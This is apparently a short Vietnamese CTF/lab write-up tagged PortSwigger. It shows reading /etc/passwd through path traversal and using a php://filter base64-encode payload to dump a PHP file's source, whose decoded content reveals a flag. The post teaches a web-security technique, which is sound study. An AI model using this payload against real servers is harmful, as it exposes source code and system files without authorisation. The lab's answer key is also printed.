---
layout: post
title: "Đọc File Content Thông Qua Schema: PHP:///"
render_with_liquid: false
categories:
  - Web Security
tags:
  - portswigger
  - path-traversal
source_collection: notion_portswigger
---
Mở đầu Challenge 

![image.png](/assets/img/portswigger/doc-file-content-thong-qua-schema-php/image.png)

Ta có thể dễ dàng duyệt qua các file, nếu biết vị trí của chúng

Ví dụ: `/etc/passwd`

![image.png](/assets/img/portswigger/doc-file-content-thong-qua-schema-php/image%201.png)

`Exploit` 

Sử dụng `php://filter/read=convert.base64-encode/resource=flag.php` đã được nhắc đến trong phần lý thuyết, để đọc nội dung file PHP

![image.png](/assets/img/portswigger/doc-file-content-thong-qua-schema-php/image%202.png)

Decode chuỗi `PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ZDc2MjczNmQtODI4OS00NDg2LWEzOGItODIzNjhkMWM1MjlkfQo=` ta được 

```python
<?php
echo "Can you find out the flag?";
//flag{d762736d-8289-4486-a38b-82368d1c529d}
```
